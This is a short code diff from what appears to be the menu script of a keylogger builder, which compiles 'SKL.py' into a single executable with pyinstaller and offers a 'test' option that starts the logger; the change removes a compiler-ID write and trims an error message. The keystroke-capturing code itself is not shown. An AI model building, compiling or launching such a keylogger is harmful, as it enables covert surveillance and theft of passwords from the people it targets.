@@ -346,10 +346,8 @@ def __main__():
         try:
           
            os.system("pyinstaller --onefile SKL.py")
-           status = open("compilerID.txt")
-           status.write(random.randint(10000,99999))
         except:
-            print(bcolors.FAIL + "Failed to compile KeyLogger.\n Please make sure SKlogger.py is in the directory of this file.")
+            print(bcolors.FAIL + "Failed to compile KeyLogger.")
     elif CONSOLE.lower() == "test":
         try:
             START_LOGGER()
